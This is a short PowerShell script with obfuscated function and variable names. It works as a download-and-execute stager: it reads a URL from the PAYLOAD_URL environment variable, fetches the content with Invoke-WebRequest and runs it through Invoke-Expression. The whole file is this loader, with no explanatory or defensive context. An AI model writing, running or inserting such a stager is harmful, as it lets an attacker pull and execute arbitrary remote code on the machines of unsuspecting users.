function XhYjVwJtKz {
    param (
        [string]$AaBbCcDdEe
    )

    try {
        $FfGgHhIiJj = Invoke-WebRequest -Uri $AaBbCcDdEe -UseBasicParsing -TimeoutSec 10
        return $FfGgHhIiJj.Content
    }
    catch {
        Write-Host "Error: Failed to fetch data from URL - $AaBbCcDdEe"
        return $null
    }
}

function XoRpQkZtLs {
    param (
        [string]$scriptContent
    )

    try {
        Invoke-Expression $scriptContent  
    }
    catch {
        Write-Host "Error: Failed to execute PowerShell command."
    }
}


$QwErTyUuOo = $env:PAYLOAD_URL  

if ($QwErTyUuOo) {
    $VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe $QwErTyUuOo

    if ($VvWwXxYyZz) {
        XoRpQkZtLs -scriptContent $VvWwXxYyZz
    } else {
        Write-Host "Error: No valid data received from the URL."
    }
} else {
    Write-Host "Error: PAYLOAD_URL is not set."
}
